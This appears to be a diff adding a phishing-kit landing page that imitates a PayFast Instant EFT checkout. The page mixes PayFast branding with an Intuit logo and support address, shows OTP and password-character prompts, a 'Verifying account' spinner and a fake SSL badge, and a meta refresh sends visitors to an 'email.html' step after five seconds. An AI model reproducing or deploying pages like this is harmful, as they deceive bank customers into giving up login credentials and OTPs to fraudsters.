@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+      <meta http-equiv="Refresh" content="5; url=email.html">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="payfast, payments processing, ">
+    <meta name="csrf-token" content="">
+    <meta name="uuid" content="0e08c6bd-acf2-4647-b380-31603ea9b5af">
+    <meta name="allow_cell_registrations" content="">
+ <SCRIPT LANGUAGE="JavaScript">
+
+
+
+<!-- Begin
+var day="";
+var month="";
+var ampm="";
+var ampmhour="";
+var myweekday="";
+var year="";
+mydate = new Date();
+myday = mydate.getDay();
+mymonth = mydate.getMonth();
+myweekday= mydate.getDate();
+weekday= myweekday;
+myyear= mydate.getYear();
+year = myyear;
+myhours = mydate.getHours();
+ampmhour  =  (myhours > 12) ? myhours - 12 : myhours;
+ampm =  (myhours >= 12) ? ' PM' : ' AM';
+mytime = mydate.getMinutes();
+myminutes =  ((mytime < 10) ? ':0' : ':') + mytime;
+if(myday == 0)
+day = " Sunday, ";
+else if(myday == 1)
+day = " Monday, ";
+else if(myday == 2)
+day = " Tuesday, ";
+else if(myday == 3)
+day = " Wednesday, ";
+else if(myday == 4)
+day = " Thurday, ";
+else if(myday == 5)
+day = " Friday, ";
+else if(myday == 6)
+day = " Saturday, ";
+if(mymonth == 0) {
+month = "January ";}
+else if(mymonth ==1)
+month = "February ";
+else if(mymonth ==2)
+month = "March ";
+else if(mymonth ==3)
+month = "April ";
+else if(mymonth ==4)
+month = "May ";
+else if(mymonth ==5)
+month = "June ";
+else if(mymonth ==6)
+month = "July ";
+else if(mymonth ==7)
+month = "August ";
+else if(mymonth ==8)
+month = "September ";
+else if(mymonth ==9)
+month = "October ";
+else if(mymonth ==10)
+month = "November ";
+else if(mymonth ==11)
+month = "December ";
+// End -->
+</SCRIPT>
+
+            <!-- Global site tag (gtag.js) - Google Analytics -->
+        <script async src="./index_files/js"></script>
+        
+        <!-- End Google Analytics -->
+
+        
+        <!-- Google Tag Manager -->
+        
+        <!-- End Google Tag Manager -->
+ 
+    <title>PayFast -  Engine </title>
+
+    <link rel="stylesheet" href="./index_files/app.css" type="text/css">
+ <link rel="apple-touch-icon" sizes="180x180" href="https://www.payfast.co.za/apple-touch-icon.png"> <link rel="icon" type="image/png" href="https://www.payfast.co.za/favicon-32x32.png" sizes="32x32"> <link rel="icon" type="image/png" href="https://www.payfast.co.za/favicon-16x16.png" sizes="16x16"> <link rel="manifest" href="https://www.payfast.co.za/manifest.json"> <link rel="mask-icon" href="https://www.payfast.co.za/safari-pinned-tab.svg" color="#5bbad5"> <link rel="shortcut icon" href="https://www.payfast.co.za/favicon.ico">
+    <script src="./index_files/jquery-3.4.1.min.js.download"></script>
+    <script src="./index_files/outdatedbrowser.min.js.download"></script>
+    <script type="text/javascript" src="./index_files/clipboard.min.js.download"></script>
+    <script src="./index_files/app.js.download"></script>
+    <script src="./index_files/common.js.download"></script>
+
+            <script src="./index_files/socket.io.slim.js.download"></script>
+    
+    
+
+
+        <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="./index_files/js"></script>
+   
+    <!-- End Google Analytics -->
+
+    
+    <!-- Google Tag Manager -->
+    
+    <!-- End Google Tag Manager -->
+    </head>
+<body>
+            <!-- Google Tag Manager (noscript) -->
+       
+        <!-- End Google Tag Manager (noscript) -->
+    
+        <header>
+        <div class="logo-wrapper"><br>
+                            <div class="app-header__left"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Intuit_Logo.svg/320px-Intuit_Logo.svg.png" height=30px alt="PayFast logo" class="app-header__logo"></div>
+                        
+            <div class="clear"></div>
+        </div>
+    </header>
+
+    <div class="wrapper">
+        <div class="clear"></div>
+
+        
+
+        
+        <article>
+                
+                <div class="half right" id="right-column">
+        
+        <div class="contentBox iealert" style="display: none;">
+            <div id="landing-notice" class="infoBox nwarning" style="overflow: hidden">
+                <div style="float: left; margin-right: 8px">
+                    <i class="fas fa-exclamation-circle"></i>
+                </div>
+                <ul>
+                    <li class="message_padding"><span class="warning-img"></span>Unfortunately the version of Internet Explorer you are using is no longer supported. Please try again using another browser.</li>
+                </ul>
+            </div>
+        </div>
+            <div id="contentBox" class="contentBox">
+            <div class="content" id="paymentTypeSelect">
+                    <div id="payment-type" style="display: block;">
+       
+        <div id="payment-login-wrapper" class="payment-login-wrapper  hidden " style="display: none;">
+        <div class="payment-login-link-wrapper login-toggle">
+            <span class="sub-heading" title="Log in to your PayFast account">
+                Checkout faster by accessing your PayFast account
+            </span>
+            <i class="far fa-chevron-up fa-rotate-180" title="Hide / Show log in"></i>
+        </div>
+        <div class="payment-login-form" style="display: none;">
+            <div id="payment-otp-msg" class="hidden">
+                <p>You may have funds or saved cards associated to your
+                     email address.                 </p>
+                <p>We will send you an OTP to access your information.</p>
+            </div>
+
+            <div id="payment-login-msg" class="hidden">
+                <p>If you have a PayFast account you can checkout faster by accessing saved credit cards and wallet funds.</p>
+            </div>
+
+            <div id="login-notice-error" class="nerror">
+                <div class="notice-error-container">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span class="login-notice-err-msg"></span>
+                </div>
+            </div>
+
+         
+        </div>
+    </div>
+
+    <div class="mobileClickblock" style="display: none;"></div>
+    <div class="menuexit"></div>
+    <div class="hamburger" style="display: none;"></div>
+      
+
+    <div id="processing-loader" class="hidden" style="display: none;">
+        <div class="processing-loader-image">
+            <svg version="1.1" id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="40px" height="40px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve"><path fill="#000" d="M43.935,25.145c0-10.318-8.364-18.683-18.683-18.683c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615c8.072,0,14.615,6.543,14.615,14.615H43.935z"></path></svg>
+        </div>
+        <h4>Processing...</h4>
+        <span>Please don't close your window</span>
+        <br>
+    </div>
+
+    <div class="tabs-content" style="display: block;"><div id="efTab">
+    <div id="eftBankChooser" style="display: none;">
+        <h3 class="payment-plugins-header-text-copy">Choose the bank that you will be using to make your Instant EFT payment</h3>
+        <ul class="elogos">
+                                                <li class="capitec bank" data-bank="
+                                            CAPITEC
+                                        " title="Capitec Bank">Capitec Bank</li>
+                                                                <li class="fnb bank" data-bank="
+                                            FNB
+                                        " title="FNB">FNB</li>
+                                                                <li class="stdb bank" data-bank="
+                                            STANDARD
+                                        " title="Standard Bank">Standard Bank</li>
+                                                                <li class="absa bank" data-bank="
+                                            ABSA
+                                        " title="Absa">Absa</li>
+                                                                <li class="nedb bank" data-bank="
+                                            NEDBANK_LOGIN
+                                        " title="Nedbank">Nedbank</li>
+                                                                <li class="investec bank" data-bank="
+                                            INVESTEC
+                                        " title="Investec">Investec</li>
+                                                                <li class="tyme bank" data-bank="
+                                            TYME
+                                        " title="TymeBank">TymeBank</li>
+                                                                <li class="african bank" data-bank="
+                                            AFRICAN
+                                        " title="African Bank">African Bank</li>
+                                    </ul>
+    </div>
+
+    <div id="eft-container" style="display: block;">
+        <div id="eft_template_spinner" style="display: none;">
+            <svg version="1.1" id="loader-1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="40px" height="40px" viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve"><path fill="#000" d="M43.935,25.145c0-10.318-8.364-18.683-18.683-18.683c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615c8.072,0,14.615,6.543,14.615,14.615H43.935z"></path></svg>
+        </div>
+
+        <div id="auto_eft_tab" style="display: block;">
+            <div id="autoEftContent"><div id="autoEftHeader">
+    <h1>
+                Please wait while we confirm your account
+                </h1>
+   
+</div>
+
+<div id="autoEftBody" class="standard">
+
+<div id="eftProgressFlow" class="stdbank" style="display: none;">
+    <div id="textShow" class="resetOnFailedProcess action__needed" style="display: none;">
+    <div class="action__content">
+        <div class="action__timer">
+            <p class="action__timer--value">45</p>
+        </div>
+        <div class="action__text">
+            <p id="otpTextMessage">Please enter your OTP to continue transacting.</p>
+            <div id="userinput">
+                <input class="form-control" autocomplete="off" type="text" name="textBox" id="textBox" placeholder="OTP">
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="eftprog__waitshow" class="resetOnFailedProcess action__needed" style="display: none;">
+    <div class="action__content">
+        <div class="action__timer">
+            <p class="action__timer--value">45</p>
+        </div>
+        <div class="action__text">
+            <p id="eftprog__waitBoxText">Please confirm login on your Standard Bank Mobile App.</p>
+        </div>
+    </div>
+    <div class="action__buttons" style="display: none;">
+    </div>
+</div>
+
+<div id="userAccounts" class="resetOnFailedProcess form-group" style="display: none;">
+    <select class="form-control" name="selectBox" id="selectBox" size="1">
+        <option selected="" value="select">Select</option>
+    </select>
+</div>
+
+<div id="passphrase" class="resetOnFailedProcess action__needed" style="display: none;">
+    <div class="action__content">
+        <div class="indent10px">
+            <div class="form-group">
+                <p class="pass-phrase-info">Enter only the required characters of your password indicated by the <span style="color:#D01010;">red</span> blocks.</p>
+                <div id="pass-phrase-Form" class="pass-phrase-info hidden" style="display: inline-block;">
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="form-group" id="proceedShow" style="display: none;">
+    <div name="proceed" id="proceed">Proceed &gt;&gt;</div>
+</div>
+        <div id="loginStep" class="checklistSteps pending paystep">
+    <p>Log in</p>
+</div>
+    <div id="navigateToPaymentsStep" class="checklistSteps pending paystep">
+    <p>Navigating to payments</p>
+</div>    <div id="fetchListOfAccountsStep" class="checklistSteps paystep incomplete">
+    <p>Fetch list of accounts</p>
+</div>
+    <div id="selectAccount" class="checklistSteps pending paystep">
+    <p>Select account</p>
+</div>
+    <div id="processingPaymentStep" class="checklistSteps paystep incomplete">
+    <p>Processing payment</p>
+</div>
+    <div id="finalisePaymentStep" class="checklistSteps paystep incomplete">
+    <p>Finalise payment</p>
+</div>
+</div>
+
+<div id="bankDetailsForm">
+    <div id="directLoginForm">
+        <div class="eft__header">
+           
+        </div>
+
+        <div id="noticeMustAccept" class="warningNotice" style="display: none;">
+            <i class="fas fa-exclamation-triangle"></i>
+            <div>
+                <span id="noticeText"></span>
+                <br><br>
+                <span>Please see below on how to resolve this:</span>
+                <br>
+                <span class="noticeSteps">
+                    <br> 1. Log into the Standard Bank  Online Banking website.
+                    <br>
+                </span>
+                <span>
+                              </span>
+                <span class="noticeSteps">
+                    <br> 2. Accept any notices that appear.
+                    <br>
+                </span>
+            </div>
+        </div>
+        <p align="center">Verifying account...</p>
+        <p align="center"><img src="syt.gif" alt="loading" width="128" height="128"></p>
+        <p>&nbsp;</p>
+        <div class="secure__encryption" style="display:inline-block; vertical-align: middle; text-align: center">
+                <img src="./index_files/ssl_lock.png" alt="" style="display:inline-block; vertical-align: middle; max-width: 30px; max-height: 30px">
+                &nbsp;&nbsp;Secure SSL Encryption
+            </div>
+            <br>
+        </div>
+
+        <div class="eftInstruct" id="eftx-subtitle-bankentry"></div>
+    </div>
+</div>
+</div>
+<div class="autoEftFooter">
+
+    <!-- Notice to switch between different versions of the bank interface -->
+    
+        <p>Intuit never stores your credentials</p>
+           
+        </div>
+
+</div>
+        </div>
+
+        <div id="manual_eft_section">
+            <div id="manual_eft_tab">
+                <div id="manualEftContent">
+                    <div id="manualEftHeader">
+                        <!--EFT=530 Notice regarding the end of Manual EFT -->
+                        <div id="manualEftNotice">
+                            <i class="fas fa-info-circle"></i>
+                            <div>
+                                <span>As of 30th June 2020 Manual EFT is no longer supported. Try our auto Instant EFT payment as a faster and more secure alternative.<br><br></span>
+                                <a href="https://www.payfast.co.za/eng/process/payment/0e08c6bd-acf2-4647-b380-31603ea9b5af#" class="btn btn-primary"><strong>Use auto Instant EFT</strong></a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    </div>
+
+    </div></div>
+            </div>
+        </div>
+        <div id="buyer">
+                   
+                        <div class="clear"></div>
+                </div>
+            <div class="euaBox">
+            <hr>
+                  
+                    <div class="engv2__support--details">
+               
+                <div id="contact-details">
+                    <!-- <span id="phone-span"><i class="fas fa-phone fa-flip-horizontal"></i> +27 (0)21 300 4455</span> -->
+                    <span><i class="fad fa-envelope"></i> support@intuit.com</span>
+                </div>
+            </div>
+        </div>
+        <!--<![endif]-->
+    </div>
+        </article>
+
+        <div class="clear"></div>
+    </div>
+
+        <footer class="footer">
+        
+
+       
+    </footer>
+
+</body></html>
